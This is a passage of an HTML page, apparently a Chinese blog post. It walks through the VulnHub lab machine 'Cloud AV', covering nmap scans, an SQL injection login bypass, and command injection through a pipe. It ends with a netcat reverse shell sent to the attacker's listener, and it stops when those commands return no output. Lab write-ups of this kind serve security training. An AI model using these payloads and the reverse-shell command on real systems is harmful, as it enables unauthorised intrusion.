@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Name: BoredHackerBlog: Cloud AV Date release: 29 Mar 2020 Author: BoredHackerBlog Series: BoredHackerBlog Download：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;boredhackerblog&#x2F;easy_cloudantivirus.ova Description: Cl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub-2-BoredHackerBlog:Cloud AV">
+<meta property="og:url" content="http://byesec.com/posts/7a8f303.html">
+<meta property="og:site_name" content="patrik&#39;s blog">
+<meta property="og:description" content="Name: BoredHackerBlog: Cloud AV Date release: 29 Mar 2020 Author: BoredHackerBlog Series: BoredHackerBlog Download：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;boredhackerblog&#x2F;easy_cloudantivirus.ova Description: Cl">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009095714305.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009095857623.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009101228440.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009101354083.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009102035206.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009103133428.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009104716945.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009104651517.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009104834953.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009105012567.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009105106411.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009105148438.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009142912228.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009142744487.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009143025187.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009143140893.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009143219519.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009143635524.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211011150457393.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009145019507.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009145202343.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009145552070.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009145754300.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009151033812.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009151112767.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009151631066.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009152025908.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009151902078.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009152136352.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009152503151.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009152617144.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009152646495.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009152831159.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009153106205.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009153238876.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009153516608.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009153446916.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009153702323.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009153648892.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009154535990.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009160341754.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009160512163.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009164418370.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009165417380.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009165635210.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009165823593.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009165854532.png">
+<meta property="article:published_time" content="2022-01-03T09:31:34.000Z">
+<meta property="article:modified_time" content="2022-08-05T08:48:10.977Z">
+<meta property="article:author" content="patrik">
+<meta property="article:tag" content="靶机🎯">
+<meta property="article:tag" content="VulnHub🎯">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009095714305.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://www.gravatar.com/avatar/1c0ccb80f18de6871d3fd37b97cd3594?s=48">
+          
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo-1.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo-1.png">
+        
+      
+    
+    <!-- title -->
+    <title>VulnHub-2-BoredHackerBlog:Cloud AV</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="patrik&#39;s blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/4255005c.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/b64dbbde.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://byesec.com/posts/7a8f303.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://byesec.com/posts/7a8f303.html&text=VulnHub-2-BoredHackerBlog:Cloud AV"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://byesec.com/posts/7a8f303.html&title=VulnHub-2-BoredHackerBlog:Cloud AV"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://byesec.com/posts/7a8f303.html&is_video=false&description=VulnHub-2-BoredHackerBlog:Cloud AV"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnHub-2-BoredHackerBlog:Cloud AV&body=Check out this article: http://byesec.com/posts/7a8f303.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://byesec.com/posts/7a8f303.html&title=VulnHub-2-BoredHackerBlog:Cloud AV"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://byesec.com/posts/7a8f303.html&title=VulnHub-2-BoredHackerBlog:Cloud AV"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://byesec.com/posts/7a8f303.html&title=VulnHub-2-BoredHackerBlog:Cloud AV"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://byesec.com/posts/7a8f303.html&title=VulnHub-2-BoredHackerBlog:Cloud AV"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://byesec.com/posts/7a8f303.html&name=VulnHub-2-BoredHackerBlog:Cloud AV&description=&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; BoredHackerBlog: Cloud AV&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Date release:&lt;/strong&gt; 29 Mar 2020&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Author&lt;/strong&gt;: &lt;a href=&#34;https://www.vulnhub.com/author/boredhackerblog,683/&#34;&gt;BoredHackerBlog&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Series&lt;/strong&gt;: &lt;a href=&#34;https://www.vulnhub.com/series/boredhackerblog,295/&#34;&gt;BoredHackerBlog&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Download：&lt;/strong&gt;&lt;a href=&#34;https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova&#34;&gt;https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Cloud Anti-Virus Scanner! is a cloud-based antivirus scanning service.&lt;/p&gt;
+&lt;p&gt;Currently, it’s in beta mode. You’ve been asked to test the setup and find vulnerabilities and escalate privs.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Difficulty:&lt;/strong&gt; Easy&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Tasks involved:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;port scanning&lt;/li&gt;
+&lt;li&gt;webapp attacks&lt;/li&gt;
+&lt;li&gt;sql injection&lt;/li&gt;
+&lt;li&gt;command injection&lt;/li&gt;
+&lt;li&gt;brute forcing&lt;/li&gt;
+&lt;li&gt;code analysis&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Virtual Machine:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Format: Virtual Machine (Virtualbox OVA)&lt;/li&gt;
+&lt;li&gt;Operating System: Linux&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Networking:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DHCP Service: Enabled&lt;/li&gt;
+&lt;li&gt;IP Address Automatically assign&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This works better with VirtualBox rather than VMware.&lt;/p&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://byesec.com/posts/7a8f303.html&t=VulnHub-2-BoredHackerBlog:Cloud AV"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">一、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">1.主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">2.端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E5%8F%91%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">3.端口服务扫描发现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">二、漏洞发现与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%AE%BF%E9%97%AE%E9%A1%B5%E9%9D%A2"><span class="toc-number">2.1.</span> <span class="toc-text">1.访问页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B5%8B%E8%AF%95SQL%E6%B3%A8%E5%85%A5-x2F-%E7%88%86%E7%A0%B4"><span class="toc-number">2.2.</span> <span class="toc-text">2.测试SQL注入&#x2F;爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.</span> <span class="toc-text">3.命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8nc%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.4.</span> <span class="toc-text">4.使用nc建立连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-x2F-ssh%E7%88%86%E7%A0%B4"><span class="toc-number">2.5.</span> <span class="toc-text">5.信息收集&#x2F;ssh爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-SUID%E6%8F%90%E6%9D%83"><span class="toc-number">2.6.</span> <span class="toc-text">6.SUID提权</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VulnHub-2-BoredHackerBlog:Cloud AV
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">干脆面</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-01-03T09:31:34.000Z" class="dt-published" itemprop="datePublished">2022-01-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%AE%89%E5%85%A8%F0%9F%94%90/">安全🔐</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/VulnHub%F0%9F%8E%AF/" rel="tag">VulnHub🎯</a>, <a class="p-category" href="/tags/%E9%9D%B6%E6%9C%BA%F0%9F%8E%AF/" rel="tag">靶机🎯</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p><strong>Name:</strong> BoredHackerBlog: Cloud AV</p>
+<p><strong>Date release:</strong> 29 Mar 2020</p>
+<p><strong>Author</strong>: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/author/boredhackerblog,683/">BoredHackerBlog</a></p>
+<p><strong>Series</strong>: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/series/boredhackerblog,295/">BoredHackerBlog</a></p>
+<p><strong>Download：</strong><a target="_blank" rel="noopener" href="https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova">https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova</a></p>
+<p><strong>Description:</strong></p>
+<p>Cloud Anti-Virus Scanner! is a cloud-based antivirus scanning service.</p>
+<p>Currently, it’s in beta mode. You’ve been asked to test the setup and find vulnerabilities and escalate privs.</p>
+<p><strong>Difficulty:</strong> Easy</p>
+<p><strong>Tasks involved:</strong></p>
+<ul>
+<li>port scanning</li>
+<li>webapp attacks</li>
+<li>sql injection</li>
+<li>command injection</li>
+<li>brute forcing</li>
+<li>code analysis</li>
+</ul>
+<p><strong>Virtual Machine:</strong></p>
+<ul>
+<li>Format: Virtual Machine (Virtualbox OVA)</li>
+<li>Operating System: Linux</li>
+</ul>
+<p><strong>Networking:</strong></p>
+<ul>
+<li>DHCP Service: Enabled</li>
+<li>IP Address Automatically assign</li>
+</ul>
+<p>This works better with VirtualBox rather than VMware.</p>
+</blockquote>
+<span id="more"></span>
+
+
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009095714305.png" alt="image-20211009095714305"></p>
+<p>kali的IP为10.0.2.4</p>
+<p>对10.0.2.0&#x2F;24网段内的IP发送包进行探测发现<img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009095857623.png" alt="image-20211009095857623"></p>
+<p>10.0.2.7<strong>返回数据</strong>，说明<strong>存活</strong></p>
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.7</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009101228440.png" alt="image-20211009101228440"></p>
+<p>结果显示目标靶机<strong>开放了22,8080端口</strong></p>
+<h3 id="3-端口服务扫描发现"><a href="#3-端口服务扫描发现" class="headerlink" title="3.端口服务扫描发现"></a>3.端口服务扫描发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,8080 -sV 10.0.2.7</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009101354083.png" alt="image-20211009101354083"></p>
+<p>目标系统为Ubuntu 且开放了22端口为<strong>SSH服务</strong></p>
+<p>8080端口的Werkzeug是基于Python2.7环境</p>
+<p>补充：Werkzeug是一个WSGI工具包，Werkzeug可以作为一个 Web 框架的底层库，因为它封装好了很多 Web 框架的东西，例如 Request，Response 等等。如 Flask 框架就是以Werkzeug 为基础开发的。</p>
+<h2 id="二、漏洞发现与利用"><a href="#二、漏洞发现与利用" class="headerlink" title="二、漏洞发现与利用"></a>二、漏洞发现与利用</h2><h3 id="1-访问页面"><a href="#1-访问页面" class="headerlink" title="1.访问页面"></a>1.访问页面</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问：http://10.0.10.7:8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009102035206.png" alt="image-20211009102035206"></p>
+<p>页面如图为“云防病毒平台”，并提示需提交邀请码才能登录使用</p>
+<p>那么如何突破这个页面？</p>
+<h3 id="2-测试SQL注入-x2F-爆破"><a href="#2-测试SQL注入-x2F-爆破" class="headerlink" title="2.测试SQL注入&#x2F;爆破"></a>2.测试SQL注入&#x2F;爆破</h3><p>尝试在页面文本框内<strong>提交信息（特殊符号）</strong>来服务端后端有没有对用户提交的<strong>敏感字符</strong>（不同语言环境下存在不同作用&#x2F;意义的字符）进行过滤，若未过滤则有可能<strong>发生报错</strong>或会<strong>返回错误信息</strong>。</p>
+<p>配置浏览器代理，使用BurpSuite对<strong>符号</strong>进行检测</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009103133428.png" alt="image-20211009103133428"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009104716945.png" alt="image-20211009104716945"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009104651517.png" alt="image-20211009104651517"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009104834953.png" alt="image-20211009104834953"></p>
+<p>对页面进行测试后，<strong>通过长度判断</strong>，发现输入双引号(“)可能产生了闭合，改变原语句执行语义，导致报错，报错页面如下图，<strong>判断存在注入漏洞</strong></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009105012567.png" alt="image-20211009105012567"></p>
+<p>发现报错页面存在<strong>疑似查询语句</strong></p>
+<p>‘select * from code where password&#x3D;”‘ + password + ‘“‘</p>
+<p>省去单引号</p>
+<p>select * from code where password&#x3D;” + password + “</p>
+<p>尝试通过此语句构造payload</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009105106411.png" alt="image-20211009105106411"></p>
+<p>输入**1” or 1&#x3D;1–+**提交后成功利用注入漏洞跨过了“invite code”验证，进入“云防病毒平台”页面</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009105148438.png" alt="image-20211009105148438"></p>
+<h3 id="3-命令注入"><a href="#3-命令注入" class="headerlink" title="3.命令注入"></a>3.命令注入</h3><p>可以发现这个页面的所显示的信息是ls -l命令执行的结果，在结合页面下的”File Name”文本框 和”Scan!”提交按钮，可以联想到页面背后的功能实现过程大概是一个“病毒攻击&#x2F;平台”对文件扫描的功能，代码逻辑可能类似如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxScanner 文件名</span><br></pre></td></tr></table></figure>
+
+<p>那么是否可以产生使用<strong>管道符（|）</strong>连接执行其他命令呢？下面进行尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009142912228.png" alt="image-20211009142912228"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | id</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009142744487.png" alt="image-20211009142744487"></p>
+<p>在等待服务端响应后，确实执行了ls和id，并在页面返回了相应的结果，即<strong>存在命令注入漏洞</strong>，那么是否可以反弹shell？</p>
+<p>思路1：结合先前扫描结果，可以得到目标系统的语言环境是Python2.7.15，故可以利用Python反弹shell</p>
+<p>思路2：利用nc反弹shell</p>
+<p>(为了学习更多的攻击方法，选用思路2)</p>
+<h3 id="4-使用nc建立连接"><a href="#4-使用nc建立连接" class="headerlink" title="4.使用nc建立连接"></a>4.使用nc建立连接</h3><p>确认目标系统<strong>是否存在nc</strong>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | which nc</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009143025187.png" alt="image-20211009143025187"></p>
+<p>补充：**| 表示管道符，上一条命令的输出，作为下一条命令参数**</p>
+<p>目标系统<strong>存在nc</strong>命令，可正常进行后续操作</p>
+<p>在Kali端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009143140893.png" alt="image-20211009143140893"></p>
+<p>确认Kali地址为10.0.2.4</p>
+<p>nc监听端口4444</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009143219519.png" alt="image-20211009143219519"></p>
+<p>在浏览器端：</p>
+<p>使用nc反弹连接kali端的监听，在实验-e参数执行一个shell终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | nc 10.0.2.4 4444 -e /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009143635524.png" alt="image-20211009143635524"></p>
+<p>执行后，并没有监听端口成功连接，怀疑该系统的系统版本下的nc<strong>不支持-e参数</strong>，所以这里我们先去除-e参数，尝试连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | nc 10.0.2.4 4444 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211011150457393.png" alt="image-20211011150457393"></p>
+<p>成功建立连接，尝试输入命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211009145019507.png" alt="image-20211009145019507"></p>
+<p>结果发现不能执行来返回结果</p>
